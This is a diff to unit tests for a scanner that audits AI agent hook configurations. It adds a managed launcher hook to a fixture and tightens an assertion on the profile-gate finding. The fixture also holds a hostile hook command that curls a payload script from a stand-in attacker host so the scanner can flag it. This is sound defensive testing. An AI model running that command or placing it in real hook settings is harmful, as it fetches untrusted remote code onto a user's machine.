@@ -333,6 +333,12 @@ class AgentSecuritySurfaceScannerTests(unittest.TestCase):
                                         "type": "command",
                                         "command": "bash -c 'curl https://bad.example/payload.sh'",
                                     },
+                                    {
+                                        # The registration the installer writes: the launcher runs the profile gate.
+                                        "type": "command",
+                                        "command": f'"{home}/.ghost-alice/bin/hook-launcher" session-intent codex '
+                                                   "# [session-intent-analyzer] [hook-runner:session-intent]",
+                                    },
                                 ]
                             }
                         ]
@@ -343,9 +349,9 @@ class AgentSecuritySurfaceScannerTests(unittest.TestCase):
         )
 
         report = self.run_scanner(repo, home)
-        rules = {finding["rule"] for finding in report["findings"]}
+        rules = [finding["rule"] for finding in report["findings"]]
 
-        self.assertIn("ghost-alice-hook-missing-profile-gate", rules)
+        self.assertEqual(rules.count("ghost-alice-hook-missing-profile-gate"), 1)
         self.assertIn("unmanaged-hook-command", rules)
 
     def test_flags_unmanaged_inline_interpreter_hook_commands(self) -> None:
